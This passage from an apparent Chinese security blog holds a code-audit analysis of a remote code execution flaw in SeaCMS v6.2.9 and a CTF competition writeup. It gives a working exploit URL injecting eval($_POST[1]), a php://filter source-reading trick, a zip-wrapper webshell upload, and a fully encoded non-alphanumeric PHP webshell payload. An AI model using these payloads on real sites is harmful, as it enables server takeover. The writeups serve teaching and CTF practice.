<p>知识点：</p>
<ol>
<li>robots.txt</li>
<li>intval()函数</li>
</ol>
<p>###0X10()</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>海洋cmsV6.2.9 任意代码执行漏洞</title>
    <url>/2018/02/12/hai-yang-cmsv6.2.9-ren-yi-dai-ma-zhi-xing-lou-dong/</url>
    <content><![CDATA[<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="php+HTML">xxx/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code></pre>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先去search.php看一下这几个参数的位置(13-31行)</p>
<pre><code class="php">$page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1;
$searchtype = (isset($searchtype) &amp;&amp; is_numeric($searchtype)) ? $searchtype : -1;
$tid = (isset($tid) &amp;&amp; is_numeric($tid)) ? intval($tid) : 0;
if(!isset($searchword)) $searchword = &#39;&#39;;
$action = $_REQUEST[&#39;action&#39;];
$searchword = RemoveXSS(stripslashes($searchword));
$searchword = addslashes(cn_substr($searchword,20));
if($cfg_notallowstr !=&#39;&#39; &amp;&amp; m_eregi($cfg_notallowstr,$searchword))
&#123;
    ShowMsg(&quot;你的搜索关键字中存在非法内容，被系统禁止！&quot;,&quot;index.php&quot;,&quot;0&quot;,$cfg_search_time*1000);
    exit();
&#125;
if($searchword==&#39;&#39;&amp;&amp;$searchtype!=5)
&#123;
    ShowMsg(&#39;关键字不能为空！&#39;,&#39;index.php&#39;,&#39;0&#39;,$cfg_search_time*1000);
    exit();
&#125;

echoSearchPage();</code></pre>
<p>令searchtype=5，满足25行的条件<code>if($searchword==&#39;&#39;&amp;&amp;$searchtype!=5)</code></p>
<p>第184行</p>
<pre><code class="php">$content=$mainClassObj-&gt;parseIf($content);</code></pre>
<p>调用了函数<code>parseIf()</code>，定位函数看一下功能。位于/include/main.class.php第3087行</p>
<pre><code class="php">    function parseIf($content)&#123;
        if (strpos($content,&#39;&#123;if:&#39;)=== false)&#123;
        return $content;
        &#125;else&#123;
        $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);
        $labelRule2=&quot;&#123;elseif&quot;;
        $labelRule3=&quot;&#123;else&#125;&quot;;
        preg_match_all($labelRule,$content,$iar);
        $arlen=count($iar[0]);
        $elseIfFlag=false;
        for($m=0;$m&lt;$arlen;$m++)&#123;
            $strIf=$iar[1][$m];
            $strIf=$this-&gt;parseStrIf($strIf);
            $strThen=$iar[2][$m];
            $strThen=$this-&gt;parseSubIf($strThen);
            if (strpos($strThen,$labelRule2)===false)&#123;
                if (strpos($strThen,$labelRule3)&gt;=0)&#123;
                    $elsearray=explode($labelRule3,$strThen);
                    $strThen1=$elsearray[0];
                    $strElse1=$elsearray[1];
                    @eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);
                    if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;
                &#125;else&#123;
                @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);
                if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;
            &#125;else&#123;
                $elseIfArray=explode($labelRule2,$strThen);
                $elseIfArrayLen=count($elseIfArray);
                $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);
                $resultStr=$elseIfSubArray[1];
                $elseIfArraystr0=addslashes($elseIfArray[0]);
                @eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);
                for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;
                    $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);
                    $strElseIf=$this-&gt;parseStrIf($strElseIf);
                    $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));
                    @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);
                    @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);
                    if ($elseIfFlag) &#123;break;&#125;
                &#125;
                $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);
                $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));
                if(strpos($strElseIf0,&#39;==&#39;)===false&amp;&amp;strpos($strElseIf0,&#39;=&#39;)&gt;0)$strElseIf0=str_replace(&#39;=&#39;, &#39;==&#39;, $strElseIf0);
                @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);
                $content=str_replace($iar[0][$m],$resultStr,$content);
            &#125;
        &#125;
        return $content;
        &#125;
    &#125;</code></pre>
<p>可以看到函数中有多出@eval，并且包含有变量，下面我们就对变量进行分析。</p>
<p>第3107行:<code>@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</code></p>
<p>我们看一下这个变量$strIf是怎么来的</p>
<p>第3098和mai声明了变量$strIf</p>
<pre><code class="php">            $strIf=$iar[1][$m];
            $strIf=$this-&gt;parseStrIf($strIf);</code></pre>
<p>strif作为&amp;iar[1]的元素，那么我们来看一下这个&amp;iar是哪来的，在第3094行</p>
<pre><code class="php">preg_match_all($labelRule,$content,$iar);</code></pre>
<pre><code class="php">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</code></pre>
<p>这里有一个正则匹配，$iar是匹配的结果。buildregx是对正则表达式格式加工的函数。</p>
<p>看一下被匹配的$content的内容。$content是在search.php中调用函数作为参数过来的，去search.php找一找。</p>
<pre><code class="php">    if($cfg_iscache)&#123;
        if(chkFileCache($cacheName))&#123;
            $content = getFileCache($cacheName);
        &#125;else&#123;
            $content = parseSearchPart($searchTemplatePath);
            setFileCache($cacheName,$content);
        &#125;
    &#125;else&#123;
            $content = parseSearchPart($searchTemplatePath);
    &#125;</code></pre>
<p>（117-126行）</p>
<p>在/install/config.cache.ini.php第80行可以知道，$cfg_iscache = ‘1’;，默认为1.上面定义了$searchTemplatePath=/templets/default/html/cascade.html</p>
<p>chkFileCache函数在common.func.php2395行，是用来判断是否存在相同的文件。如果有就直接从文件获取，没有就执行<code>$content = parseSearchPart($searchTemplatePath);</code>，下面190行是parseSearchPart函数。</p>
<pre><code class="php">function parseSearchPart($templatePath)
&#123;
    global $mainClassObj,$tid;
    $currentTypeId = empty($tid)?0:$tid;
    $content=loadFile(sea_ROOT.$templatePath);
    $content=$mainClassObj-&gt;parseTopAndFoot($content);
    $content=$mainClassObj-&gt;parseAreaList($content);
    $content=$mainClassObj-&gt;parseHistory($content);
    $content=$mainClassObj-&gt;parseSelf($content);
    $content=$mainClassObj-&gt;parseGlobal($content);
    $content=$mainClassObj-&gt;parseMenuList($content,&quot;&quot;,$currentTypeId);
    $content=$mainClassObj-&gt;parseVideoList($content,$currentTypeId);
    $content=$mainClassObj-&gt;parsenewsList($content,$currentTypeId);
    $content=$mainClassObj-&gt;parseTopicList($content);
    return $content;
&#125;</code></pre>
<p>这几个函数的功能都差不多，cascade.html作为一个模板的作用，各个函数都是为其添加各自的内容的</p>
<p>再往下来看到一个对searchtype的判断。</p>
<pre><code class="php">if(intval($searchtype)==5)
    &#123;
        $tname = !empty($tid)?getTypeNameOnCache($tid):&#39;全部&#39;;
        $jq = !empty($jq)?$jq:&#39;全部&#39;;
        $area = !empty($area)?$area:&#39;全部&#39;;
        $year = !empty($year)?$year:&#39;全部&#39;;
        $yuyan = !empty($yuyan)?$yuyan:&#39;全部&#39;;
        $letter = !empty($letter)?$letter:&#39;全部&#39;;
        $state = !empty($state)?$state:&#39;全部&#39;;
        $ver = !empty($ver)?$ver:&#39;全部&#39;;
        $money = !empty($money)?$money:&#39;全部&#39;;
        $content = str_replace(&quot;&#123;searchpage:type&#125;&quot;,$tid,$content);
        $content = str_replace(&quot;&#123;searchpage:typename&#125;&quot;,$tname ,$content);
        $content = str_replace(&quot;&#123;searchpage:year&#125;&quot;,$year,$content);
        $content = str_replace(&quot;&#123;searchpage:area&#125;&quot;,$area,$content);
        $content = str_replace(&quot;&#123;searchpage:letter&#125;&quot;,$letter,$content);
        $content = str_replace(&quot;&#123;searchpage:lang&#125;&quot;,$yuyan,$content);
        $content = str_replace(&quot;&#123;searchpage:jq&#125;&quot;,$jq,$content);
        if($state==&#39;w&#39;)&#123;$state2=&quot;完结&quot;;&#125;elseif($state==&#39;l&#39;)&#123;$state2=&quot;连载中&quot;;&#125;else&#123;$state2=&quot;全部&quot;;&#125;
        if($money==&#39;m&#39;)&#123;$money2=&quot;免费&quot;;&#125;elseif($money==&#39;s&#39;)&#123;$money2=&quot;收费&quot;;&#125;else&#123;$money2=&quot;全部&quot;;&#125;
        $content = str_replace(&quot;&#123;searchpage:state&#125;&quot;,$state2,$content);
        $content = str_replace(&quot;&#123;searchpage:money&#125;&quot;,$money2,$content);
        $content = str_replace(&quot;&#123;searchpage:ver&#125;&quot;,$ver,$content);
        $content=$mainClassObj-&gt;parsePageList($content,&quot;&quot;,$page,$pCount,$TotalResult,&quot;cascade&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;type&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;year&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;area&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;letter&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;lang&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;jq&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;state&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;ver&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;money&quot;);
    &#125;else</code></pre>
<p>对变量进行了是否为空的判断，传入了参数就使用用户传入值否则为默认值。各变量被替换到模板里面。</p>
<p>这时候$content就是原来cascade.html经过替换组装后的内容。</p>
<p>这时候content进入parseIf()函数，经过<code>preg_match_all($labelRule,$content,$iar);</code>的匹配后会匹配出{if:(.*?)}这种形式的内容作为$strIf的值。在cascade.html中可以看到要匹配的内容</p>
<pre><code class="html">      &lt;dl&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:typeitemlist&#125;&#123;if: [typeitemlist:value]=&#123;searchpage:typename&#125;&#125;&lt;b&gt;&lt;a href=&quot;[typeitemlist:link]&quot;&gt;[typeitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[typeitemlist:link]&quot;&gt;[typeitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:typeitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:areaitemlist&#125;&#123;if: [areaitemlist:value]=&#123;searchpage:area&#125;&#125;&lt;b&gt;&lt;a href=&quot;[areaitemlist:link]&quot;&gt;[areaitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[areaitemlist:link]&quot;&gt;[areaitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:areaitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:yearitemlist&#125;&#123;if: [yearitemlist:value]=&#123;searchpage:year&#125;&#125;&lt;b&gt;&lt;a href=&quot;[yearitemlist:link]&quot;&gt;[yearitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[yearitemlist:link]&quot;&gt;[yearitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:yearitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:letteritemlist&#125;&#123;if: [letteritemlist:value]=&#123;searchpage:letter&#125;&#125;&lt;b&gt;&lt;a href=&quot;[letteritemlist:link]&quot;&gt;[letteritemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[letteritemlist:link]&quot;&gt;[letteritemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:letteritemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:langitemlist&#125;&#123;if: [langitemlist:value]=&#123;searchpage:lang&#125;&#125;&lt;b&gt;&lt;a href=&quot;[langitemlist:link]&quot;&gt;[langitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[langitemlist:link]&quot;&gt;[langitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:langitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:jqitemlist&#125;&#123;if: [jqitemlist:value]=&#123;searchpage:jq&#125;&#125;&lt;b&gt;&lt;a href=&quot;[jqitemlist:link]&quot;&gt;[jqitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[jqitemlist:link]&quot;&gt;[jqitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:jqitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:stateitemlist&#125;&#123;if: [stateitemlist:value]=&#123;searchpage:state&#125;&#125;&lt;b&gt;&lt;a href=&quot;[stateitemlist:link]&quot;&gt;[stateitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[stateitemlist:link]&quot;&gt;[stateitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:stateitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:veritemlist&#125;&#123;if: [veritemlist:value]=&#123;searchpage:ver&#125;&#125;&lt;b&gt;&lt;a href=&quot;[veritemlist:link]&quot;&gt;[veritemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[veritemlist:link]&quot;&gt;[veritemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:veritemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:moneyitemlist&#125;&#123;if: [moneyitemlist:value]=&#123;searchpage:money&#125;&#125;&lt;b&gt;&lt;a href=&quot;[moneyitemlist:link]&quot;&gt;[moneyitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[moneyitemlist:link]&quot;&gt;[moneyitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:moneyitemlist&#125;&lt;/dd&gt;
      &lt;/dl&gt;</code></pre>
<p>匹配到的内容是形如xx=xx这种形式，会经过parseStrIf()函数处理，看上面main.class.php的3099行。</p>
<pre><code class="php">function parseStrIf($strIf)
        &#123;
                if(strpos($strIf,&#39;=&#39;)===false)
                &#123;
                        return $strIf;
                &#125;
                if((strpos($strIf,&#39;==&#39;)===false)&amp;&amp;(strpos($strIf,&#39;=&#39;)&gt;0))
                &#123;
                        $strIf=str_replace(&#39;=&#39;, &#39;==&#39;, $strIf);
                &#125;
                $strIfArr =  explode(&#39;==&#39;,$strIf);
                return (empty($strIfArr[0])?&#39;NULL&#39;:$strIfArr[0]).&quot;==&quot;.(empty($strIfArr[1])?&#39;NULL&#39;:$strIfArr[1]);
        &#125;</code></pre>
<p>这个函数的作用就是看一下匹配到的内容有没有等号，没有直接返回，有的话将单等号替换成双等号返回。</p>
<p>然后作为$strIf的值拼接进eval执行。</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯复赛WriteUp</title>
    <url>/2017/11/27/hu-xiang-bei-fu-sai-writeup/</url>
    <content><![CDATA[<h1 id="湖湘杯复赛WriteUp"><a href="#湖湘杯复赛WriteUp" class="headerlink" title="湖湘杯复赛WriteUp"></a>湖湘杯复赛WriteUp</h1><h2 id="1-流量分析（misc）"><a href="#1-流量分析（misc）" class="headerlink" title="1.流量分析（misc）"></a>1.流量分析（misc）</h2><p>wireshark中HTTP导出对象发现flag.zip,保存得到ce.txt,打开发现是rgb值，脚本生成图片。</p>
<p>考虑到98457不能开方，所以图片尺寸不是正方形，应该是长方形的flag值，因式分解得到3<em>37</em>887.</p>
<p>实验后长宽为887*111.</p>
<pre><code class="python">from PIL import Image
x=887 
y=111
f = open(&quot;ce.txt&quot;, &#39;r&#39;)
RGBInfo = f.readlines()
f.flaglose()
flag = Image.new(&quot;RGB&quot;, (x, y)) 
for i in range(0, x):
    for j in range(0, y):
        rgb = RGBInfo[i * y + j].split(&quot;, &quot;)
        flag.putpixel([i, j],(int(rgb[0]), int(rgb[1]), int(rgb[2])))
flag.show()
flag.save(&quot;D:\Flag.jpg&quot;)
</code></pre>
<h2 id="2-MISC300"><a href="#2-MISC300" class="headerlink" title="2.MISC300"></a>2.MISC300</h2><p>根据第二行的S’The black pixels of a b/w image are at’</p>
<p>观察到文件中的数据是具有固定格式，是经过pickle模块序列化后的。</p>
<p>使用pickle可以得到坐标列表。(x,y)……..</p>
<pre><code class="python">import pickle
from PIL import Image
with open(&#39;pixels.jpg.pkl&#39;) as file:
    data = pickle.loads(file.read().encode(&#39;utf8&#39;))
info = [(int(e[0]), int(e[1])) for e in data[1:]]
width  = max([p[0] for p in info]) + 1
height = max([p[1] for p in info]) + 1
flag  = Image.new(&#39;1&#39;,(width, height),0)
point = flag.load()
for pixel in info:
    point[pixel[0], pixel[1]] = 255
flag.show()
flag.save(&quot;D:\Flagg.jpg&quot;)
</code></pre>
<h2 id="3-热身运动（misc）"><a href="#3-热身运动（misc）" class="headerlink" title="3.热身运动（misc）"></a>3.热身运动（misc）</h2><p>动图，23个图层，8X8棋盘格，对应64进制转换。解base64得到flag。</p>
<p><a href="https://baike.baidu.com/item/%E5%85%AD%E5%8D%81%E5%9B%9B%E8%BF%9B%E5%88%B6/2176107?fr=aladdin">百度百科</a></p>
<pre><code>25 38 49 33 25 55 44 49 29 5 60 49 13 21 61 38 29 22 57 46 30 23 52    
=&gt;ZmxhZ3sxdF8xNV9mdW5ueX0
=&gt;flag&#123;1t_15_funny&#125;    (解base64)</code></pre>
<h2 id="4-web200"><a href="#4-web200" class="headerlink" title="4.web200"></a>4.web200</h2><p>op参数能读取执行功能的php，尝试用伪协议读取源码。(直接就能读flag.php ……)</p>
<p><code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
<p>得到源码：</p>
<p>home.php</p>
<pre><code class="php">&lt;?php
include &#39;common.php&#39;;
?&gt;
&lt;center&gt;
&lt;div class=&quot;article&quot;&gt;
    &lt;h2&gt;Welcome!!&lt;/h2&gt;
    &lt;p&gt;
        We let you upload PNG image files and store it!&lt;br/&gt;
    &lt;/p&gt;
    &lt;p&gt;
        Get started by &lt;a href=&quot;?op=upload&quot;&gt;uploading a picture&lt;/a&gt;
    &lt;/p&gt;

&lt;/div&gt;
&lt;/center&gt;
</code></pre>
<p>指向common.php</p>
<pre><code class="php">&lt;?php
if(!defined(&#39;FROM_INDEX&#39;)) die();

define(&#39;MAX_IM_SIZE&#39;, 100);

function create_image_key() &#123;
    return sha1($_SERVER[&#39;REMOTE_ADDR&#39;] . $_SERVER[&#39;HTTP_USER_AGENT&#39;] . time() . mt_rand());
&#125;

function load_image($imagekey) &#123;
    if(1 !== preg_match(&#39;/[0-9a-f]&#123;40&#125;/&#39;, $imagekey)) &#123;
        fatal(&#39;Invalid image key.&#39;);
    &#125;

    $im = imagecreatefrompng(&quot;uploads/&#123;$imagekey&#125;.png&quot;);
    if(!$im) &#123;
        fatal(&#39;Failed to load image.&#39;);
    &#125;
    return $im;
&#125;
stream_wrapper_unregister (&quot;zip&quot;);</code></pre>
<p>将一句话打包压缩zip，如果不能直接上传就改一下后缀。通过伪协议getshell。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20171127/172506621.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20171127/172520064.png" alt="mark"></p>
<h2 id="5-web150"><a href="#5-web150" class="headerlink" title="5.web150"></a>5.web150</h2><p>–by <a href="https://windylh.github.io/">Windylh</a></p>
<p>通过.index.php.swp得到源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
$flag = &quot;*********************&quot;;
echo &quot;please input a rand_num !&quot;;
function create_password($pw_length =  10)&#123;
    $randpwd = &quot;&quot;;
    for ($i = 0; $i &lt; $pw_length; $i++)&#123;
        $randpwd .= chr(mt_rand(100, 200));
    &#125;
    return $randpwd;
&#125;

session_start();

mt_srand(time());

$pwd=create_password();

echo $pwd.&#39;||&#39;;    

if($pwd == $_GET[&#39;pwd&#39;])&#123;
    echo &quot;first&quot;;
    if($_SESSION[&#39;userLogin&#39;]==$_GET[&#39;login&#39;])
        echo &quot;Nice , you get the flag it is &quot;.$flag ;
&#125;else&#123;
    echo &quot;Wrong!&quot;;
&#125;

$_SESSION[&#39;userLogin&#39;]=create_password(32).rand();

?&gt;
</code></pre>
<p>根据时间戳生成随机数然后与pwd参数对比，可以用python脚本来getflag。</p>
<pre><code class="python">import requests

url=&#39;http://114.215.138.89:10080/&#39;

data=requests.get(url).content
data=data.split(b&#39;||&#39;)[0].split(b&#39;&lt;br&gt;&#39;)[1]

get=&#123;&#39;pwd&#39;:data&#125;
data=requests.get(url,get).content

print data
</code></pre>
<h2 id="6-web300"><a href="#6-web300" class="headerlink" title="6.web300"></a>6.web300</h2><p>题目提示getshell，并且过滤颇多。</p>
<p>要用仅剩的特殊字符构造webshell。</p>
<p>webshell</p>
<pre><code class="php">$_=[].&#39;&#39;;$_=$_[&#39;(&#39;==&#39;)&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></pre>
<p>payload</p>
<pre><code class="php">http://114.215.71.135:10080/?content=%24_%3D%5B%5D.%27%27%3B%24_%3D%24_%5B%27%7B%27%3D%3D%27%7D%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</code></pre>
<p>到shell页面执行命令getflag。</p>
<h2 id="7-简单的安卓逆向"><a href="#7-简单的安卓逆向" class="headerlink" title="7.简单的安卓逆向"></a>7.简单的安卓逆向</h2><p>–by <a href="https://windylh.github.io/">Windylh</a></p>
<p>下载apk，反编译。查看Mainactivity得到flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20171127/173433403.png" alt="mark"></p>
<h2 id="8-Re4newer"><a href="#8-Re4newer" class="headerlink" title="8.Re4newer"></a>8.Re4newer</h2><p>–by NexusHE</p>
<p>本题大概思路就是在程序中存储了一系列字符串，将其各位与0x22异或计算，并将其按顺序拼接起来，需要注意的是，拼接按照的顺序有问题，需要自己根据语序拼接起来</p>
<pre><code class="c">#include &lt;stdio.h&gt;

int main() &#123;
    int v2 = 43;
    int v[100] = &#123;
0x5F,0x56,0x13,0x7D, //_1t&#125;
0x71,0x51,0x63,0x52,
0x7D,0x57,0x7D,0x67,
0x67,0x67,0x70,0x70,
0x70,0x7D,0x47,0x4E, //le_R
0x52,0x4F,0x4B,0x51, //simp
0x7D,0x5B,0x50,0x11, //3ry_
0x54,0x7D,0x63,0x7D, //_A_v
0x71,0x4B,0x7D,0x51, //s_iS
0x13,0x4A,0x76,0x59, //&#123;Th1
0x45,0x43,0x4E,0x44, //flag
&#125;;
    do &#123;
        printf(&quot;%c&quot;, v[v2] ^ 0x22);
        v2--;
    &#125;
    while(v2 &gt; -1);
    return 0;
&#125;
</code></pre>
<h2 id="9-Encryptor-apk"><a href="#9-Encryptor-apk" class="headerlink" title="9.Encryptor.apk"></a>9.Encryptor.apk</h2><p>–by  NexusHE</p>
<p>本题大概是一个文件加密的apk，先是有一个内置的密码”Password”，计算其MD5值，将其按位取值与待加密的文件字节做异或运算，再另存到另一个文件。将其逆向处理，便获得源文件。</p>
<pre><code class="java">import java.io.*;
import java.nio.*;
import java.security.*;
import java.util.*;

public class script &#123;
    public static void main(String[] args) throws Exception&#123;
        String password = &quot;Password&quot;;
        String path = &quot;flag.encrypted&quot;;
        byte[] file1 = toByteArray(path);
        MessageDigest localMessageDigest = MessageDigest.getInstance(&quot;MD5&quot;);
        localMessageDigest.reset();
        localMessageDigest.update(password.getBytes());
        byte[] pass = localMessageDigest.digest();
